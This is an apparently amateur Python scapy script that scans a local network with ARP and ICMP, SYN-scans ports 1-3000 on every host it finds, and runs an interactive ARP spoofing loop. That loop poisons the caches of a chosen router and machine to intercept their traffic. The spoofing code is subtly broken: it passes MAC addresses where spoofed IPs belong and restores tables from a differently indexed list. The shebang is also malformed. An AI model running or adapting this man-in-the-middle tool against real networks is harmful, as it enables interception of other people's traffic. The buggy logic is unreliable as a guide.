#/usr/bin/env python3.7
import scapy.all as scapy
import version
import sys
import image
import random
import time
#import multiprocessing # work with portages
import threading  # work with streams


# Class for scanning networks using ICMP, ARP
# And to scan TCP, UDP ports
# Using scapy
class Scanners_port:
    def __init__(self, ip, time, portscan=False, arp_spoof=False):
        self.ip = ip
        self.arp_spoof = arp_spoof
        self.time = time
        self.My_Ip_Mac = []
        self.portscan = portscan
        self.client_list = []
        self.client_list_ARP = []
        self.client_list_ICMP = []
        self.open_port = []

    def ARP_scan(self):
        arp_scaner = scapy.ARP(pdst=self.ip)
        brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = brodcast / arp_scaner
        answered = scapy.srp(arp_packet, timeout=int(self.time), verbose=False)[0]
        for element in answered:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc, "Ver": str(element[1].ptype)}
            self.client_list_ARP.append(client_dict)

        my_address = {"ip":answered[0][1].pdst, "mac":answered[0][1].hwdst, "Ver":str(answered[0][1].ptype)}
        self.My_Ip_Mac.append(my_address)


    def ICMP_scan(self, ip):
        try:
            if "/24" in ip:
                new_ip = ip.split(".")
                for i in range(1, 100):
                    threading.Thread(target=self.ICMP_scan, args=(new_ip[0]+"."+new_ip[1]+"."+new_ip[2]+"."+str(i),)).start()
                time.sleep(1)
                for i in range(100, 255):
                    threading.Thread(target=self.ICMP_scan, args=(new_ip[0]+"."+new_ip[1]+"."+new_ip[2]+"."+str(i),)).start()
                time.sleep(1)
            else:
                icmp_packet = scapy.Ether()/scapy.IP(dst=ip)/scapy.ICMP()
                answered = scapy.srp1(icmp_packet, timeout=int(self.time), verbose=False)[0]
                client_dict = {"ip": answered[scapy.IP].src, "mac": answered[scapy.Ether].src, "Ver": str(answered[scapy.IP].version) }#answered[scapy.IP].version
                self.client_list_ICMP.append(client_dict)
        except TypeError:
            pass

    def prints_result(self):
        print("\033[4;1;3{}mEthernet scaner!!!\033[0m\n".format(random.randint(1,4)))
        print("\033[1;34mICMP scan:\033[0m")
        self.print_result(self.client_list_ICMP)
        print("\033[1;34mARP scan:\033[0m")
        self.print_result(self.client_list_ARP)
        print("\033[1;34mMy address:\033[0m")
        self.print_result(self.My_Ip_Mac)
        print("\033[1;34mClient scan:\033[0m")
        self.print_result(self.client_list)


    def add_client_port_scan(self):
        self.client_list = self.client_list_ICMP[:]
        a = []
        for element in self.client_list:
            a.append(element['ip'])
        for element in self.client_list_ARP:
            if element['ip'] not in a:
                self.client_list.append(element)


    def print_result(self, client_list):
        i = 0
        print("\033[31m________________________________________________________________________________________\033[0m")
        print("Number\t\033[31m|\033[0m\tIP\t\t\033[31m|\033[0m\tMAC address\t\t\033[31m|\033[0m\tVesion IP\t\033[31m|\033[0m")
        print("\033[31m----------------------------------------------------------------------------------------\033[0m")
        for element in client_list:
            print(str(i) + "\t\033[31m|\033[0m\t" + element["ip"] + "\t\033[31m|\033[0m\t" + element["mac"] + "\t\033[31m|\033[0m\t" + element["Ver"] + "\t\t\033[31m|\033[0m")
            print("\033[31m----------------------------------------------------------------------------------------\033[0m")
            i = i + 1

    # SYN worker.
    # Bistrius without detailed information
    def port_scans_SYN(self, ip, port):
        a = scapy.IP(dst=ip)
        res = scapy.sr1(a / scapy.TCP(dport=port, flags="S", seq=12344), verbose=False)
        if res.getlayer(scapy.TCP).flags == 0x12:
            self.open_port.append({'ip':ip,'port':port})
            print("\t\033[34m[+]\033[0m \033[32mPort {}/tcp Open\033[0m".format(port))

    # Doesn't work Scapy immediately drops all R
    # def port_scan_ALL(self):
    #     for element in self.open_port:
    #         a = scapy.IP(dst=element['ip'])
    #         res = scapy.sr1(a / scapy.TCP(dport=element['port'], flags="S", seq=12353), verbose=False)
    #         if res.getlayer(scapy.TCP).flags == 0x12:
    #             connect = scapy.sr1(a/scapy.TCP(dport=element['port'], flags="A", ack=res[scapy.TCP].seq+1,seq=12354), verbose=False)
    #             print(connect.show())

    ## Does not work SYN ACK
    # def port_scans_SYN_ACK(self, ip, port):
    #     a = scapy.IP(dst=ip)
    #     res = scapy.sr1(a / scapy.TCP(dport=port, flags="SA"), verbose=False)  # SYN
    #     if res.getlayer(scapy.TCP).flags == 0x04:
    #         print("\t\033[34m[+]\033[0m \033[32mPort {}/tcp Open\033[0m".format(port))

    ## Does not work FPU
    # def port_scans_FPU(self, ip, port):
    #     try:
    #         a = scapy.IP(dst=ip)
    #         res = scapy.sr1(a / scapy.TCP(dport=port, flags="FPU"), verbose=False)  # SYN
    #         if res.getlayer(scapy.TCP).flags != 0x14:
    #             print("\t\033[34m[+]\033[0m \033[32mPort {}/tcp Open\033[0m".format(port))
    #     except AttributeError:
    #         print("")

    def port_scan(self, ip):

        for i in range(1, 3001):
            try:
                threading.Thread( target = self.port_scans_SYN, daemon=True, args=(ip, i,)).start()
            except TypeError:
                pass
        time.sleep(3)
        print("\033[31m[-]\033[0m \033[32mClose scan. !!!\033[0m")

    def start_port_scan(self):
        for element in self.client_list:
            print()
            print("\033[36m________________________________________________________________________________________\033[0m")
            print("\033[31m[+]\033[0m\033[32m Scan IP {}\033[0m \033[31m<-->\033[0m".format(element["ip"]))
            self.port_scan(element["ip"])

    def arp_packet(self, ip, mac, ip_hack):
        packet = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_hack)
        scapy.send(packet, verbose=False)

    def restore(self, ip, mac, ip_hack, mac_hack):
        packets = scapy.ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_hack, hwsrc=mac_hack)
        scapy.send(packets, verbose=False, count=4)

    def arp_spoofing(self):
        b = int(input("Router MAC abd IP (number)-->"))
        c = int(input("Mashin MAC and IP (number)-->"))
        i = 0
        try:
            while True:
                self.arp_packet(self.client_list_ARP[b]["ip"], self.client_list_ARP[b]["mac"],self.client_list_ARP[c]["mac"])
                self.arp_packet(self.client_list_ARP[c]["ip"], self.client_list_ARP[c]["mac"], self.client_list_ARP[b]["mac"])
                i = i+2
                print("\r[+] Packets sent:" + str(i), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[-] Detected CTRL + C ...... \n[+] Resetting ARP table ...... Please wait.\n[+] Quitting .....")
            self.restore(self.client_list[c]["ip"], self.client_list[c]["mac"], self.client_list[b]["ip"], self.client_list[b]["mac"])
            self.restore(self.client_list[b]["ip"], self.client_list[b]["mac"], self.client_list[c]["ip"], self.client_list[c]["mac"])


    def star(self):
        print(image.images())
        print(version.prints())
        self.ARP_scan()
        self.ICMP_scan(self.ip)
        self.add_client_port_scan()
        self.prints_result()
        if self.portscan:
            self.start_port_scan()
            print()
            print("\033[36m________________________________________________________________________________________\033[0m")
        if self.arp_spoof:
            self.arp_spoofing()
        sys.exit()